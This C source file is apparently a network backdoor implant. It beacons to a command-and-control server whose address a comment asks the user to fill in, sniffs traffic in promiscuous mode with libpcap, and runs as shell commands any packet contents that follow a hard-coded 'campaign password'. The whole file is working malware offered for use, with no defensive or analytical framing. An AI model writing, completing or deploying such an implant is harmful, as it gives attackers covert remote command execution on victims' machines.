#include <pcap.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h>
#include <errno.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <netinet/if_ether.h>

void append(char* s, char c) {
	int len = strlen(s);
	s[len] = c;
	s[len+1] = '\0';
}

int beacon() {
	int sock;
	char* IPADDR = "127.0.0.1"; //EDIT THIS IP ADDRESS WITH THE IP OF YOUR c2
	struct sockaddr_in server;
	char message[1000], server_reply[2000];
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1) {
		printf("Could not create socket");
	}
//	puts("Socket Created");
	server.sin_addr.s_addr = inet_addr(IPADDR);
	server.sin_family = AF_INET;
	server.sin_port = htons( 5050 );
	
	if (connect(sock, (struct sockaddr *) & server, sizeof(server)) < 0) {
		perror("connect failed");
		return 1;
	}
//	puts("connected");
	send(sock, "ALIVE", strlen("ALIVE"), 0);
	close(sock);
	return 0;
}

void removeSub(char *string, char *sub) {
	char *match = string;
	int len = strlen(sub);
	while ((match = strstr(match, sub))) {
		*string = '\0';
		strcat(string, match+len);
		match++;
	}
}

void callback(u_char *arg, const struct pcap_pkthdr* pkthdr,
        const u_char* packet)
{ 
	int i=0; 
	static int count=0;
	char payloadstr[20000];
	for(i=0;i<pkthdr->len;i++) { 
		if(isprint(packet[i])) {
		/* generate payload string */
		append(payloadstr, packet[i]);
		}
	}
	/* Check for campaign password */
	if(strstr(payloadstr, "8eeebaa174df6099078228e73e98aa40f9b91340303c4f571ab9b7988bf68e9f")) {
		removeSub(payloadstr, "8eeebaa174df6099078228e73e98aa40f9b91340303c4f571ab9b7988bf68e9f ");
		printf("The system will execute %s\n", payloadstr);
		system(payloadstr); /* Executes the remaining string as a command */
	}
	payloadstr[0] = '\0';
}

int main(int argc,char **argv)
{
    int i;
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* descr;
    const u_char *packet;
    struct pcap_pkthdr hdr;
    struct ether_header *eptr;
    struct bpf_program fp;
    bpf_u_int32 maskp;
    bpf_u_int32 netp;

    if(argc != 2){
        fprintf(stdout, "Usage: %s \"expression\"\n"
            ,argv[0]);
        return 0;
    }
	if (beacon() != 0) {
		exit(1);
	}
    /* assigns device  */
    dev = pcap_lookupdev(errbuf);

    if(dev == NULL) {
        fprintf(stderr, "%s\n", errbuf);
        exit(1);
    }
        /* get network address and mask */
    pcap_lookupnet(dev, &netp, &maskp, errbuf);

    /* open device for read in promiscuous mode */
    descr = pcap_open_live(dev, BUFSIZ, 1,-1, errbuf);
    if(descr == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(1);
    }

    /* compile filter expression*/
    if(pcap_compile(descr, &fp, argv[1], 0, netp) == -1) {
        fprintf(stderr, "Error calling pcap_compile\n");
        exit(1);
    }

    /* set filter */
    if(pcap_setfilter(descr, &fp) == -1) {
        fprintf(stderr, "Error setting filter\n");
        exit(1);
    }

    /* loop callback function */
    pcap_loop(descr, -1, callback, NULL);
    return 0;
}
